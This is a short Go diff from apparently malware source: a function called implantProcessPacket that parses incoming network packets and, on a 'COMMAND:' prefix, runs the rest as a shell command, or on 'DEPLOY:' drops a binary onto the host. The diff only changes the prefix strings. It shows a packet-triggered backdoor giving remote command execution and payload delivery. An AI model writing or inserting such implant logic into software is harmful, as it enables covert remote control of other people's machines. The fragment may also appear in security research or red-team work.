@@ -76,10 +76,10 @@ func implantProcessPacket(packet gopacket.Packet, hostIP net.IP) {
 	// Split the string to get the important parts
 	// Rejoin string to put into a single bash command string
 	switch payload[0] {
-	case "COMMAND":
+	case "COMMAND:":
 		command := strings.Join(payload[1:], " ")
 		execCommand(command)
-	case "DEPLOY":
+	case "DEPLOY:":
 		dropBinary(payload[1], payload[2])
 	}
 }
